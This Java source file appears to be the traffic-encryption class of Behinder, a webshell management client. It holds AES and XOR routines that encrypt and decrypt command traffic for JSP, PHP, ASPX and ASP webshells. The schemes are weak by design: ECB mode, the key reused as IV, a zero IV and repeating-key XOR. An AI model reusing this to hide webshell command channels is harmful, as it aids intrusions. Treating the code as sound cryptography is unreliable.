package net.rebeyond.behinder.core;

import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.nio.charset.StandardCharsets;

public class Crypt {
    public Crypt() {
    }

    public static byte[] Encrypt(byte[] bs, String key) throws Exception {
        byte[] raw = key.getBytes(StandardCharsets.UTF_8);
        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        return cipher.doFinal(bs);
    }

    public static byte[] Decrypt(byte[] bs, String key, int encryptType, String type) throws Exception {
        byte[] result = null;
        switch (type) {
            case "jsp":
                result = DecryptForJava(bs, key);
                break;
            case "php":
                result = DecryptForPhp(bs, key, encryptType);
                break;
            case "aspx":
                result = DecryptForCSharp(bs, key);
                break;
            case "asp":
                result = DecryptForAsp(bs, key);
                break;
        }

        return result;
    }

    public static byte[] DecryptForJava(byte[] bs, String key) throws Exception {
        byte[] raw = key.getBytes(StandardCharsets.UTF_8);
        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(2, skeySpec);
        return cipher.doFinal(bs);
    }

    public static byte[] EncryptForCSharp(byte[] bs, String key) throws Exception {
        byte[] raw = key.getBytes(StandardCharsets.UTF_8);
        IvParameterSpec iv = new IvParameterSpec(raw);
        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(1, skeySpec, iv);
        return cipher.doFinal(bs);
    }

    public static byte[] DecryptForCSharp(byte[] bs, String key) throws Exception {
        byte[] raw = key.getBytes(StandardCharsets.UTF_8);
        IvParameterSpec iv = new IvParameterSpec(raw);
        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(2, skeySpec, iv);
        return cipher.doFinal(bs);
    }

    public static byte[] EncryptForPhp(byte[] bs, String key, int encryptType) throws Exception {
        byte[] encrypted = null;
        if (encryptType == Constants.ENCRYPT_TYPE_AES) {
            byte[] raw = key.getBytes(StandardCharsets.UTF_8);
            SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(1, skeySpec, new IvParameterSpec(new byte[]{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}));
            encrypted = cipher.doFinal(bs);
        } else if (encryptType == Constants.ENCRYPT_TYPE_XOR) {
            encrypted = DecryptForAsp(bs, key);
        }

        return encrypted;
    }

    public static byte[] EncryptForAsp(byte[] bs, String key) {
        for (int i = 0; i < bs.length; ++i) {
            bs[i] ^= key.getBytes()[i + 1 & 15];
        }

        return bs;
    }

    public static byte[] DecryptForPhp(byte[] bs, String key, int encryptType) throws Exception {
        byte[] decrypted = null;
        if (encryptType == Constants.ENCRYPT_TYPE_AES) {
            byte[] raw = key.getBytes(StandardCharsets.UTF_8);
            bs = Base64.decode(new String(bs));
            SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(2, skeySpec, new IvParameterSpec(new byte[]{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}));
            decrypted = cipher.doFinal(bs);
        } else if (encryptType == Constants.ENCRYPT_TYPE_XOR) {
            decrypted = DecryptForAsp(bs, key);
        }

        return decrypted;
    }

    public static byte[] DecryptForAsp(byte[] bs, String key) {
        for (int i = 0; i < bs.length; ++i) {
            bs[i] ^= key.getBytes()[i + 1 & 15];
        }
        return bs;
    }
}
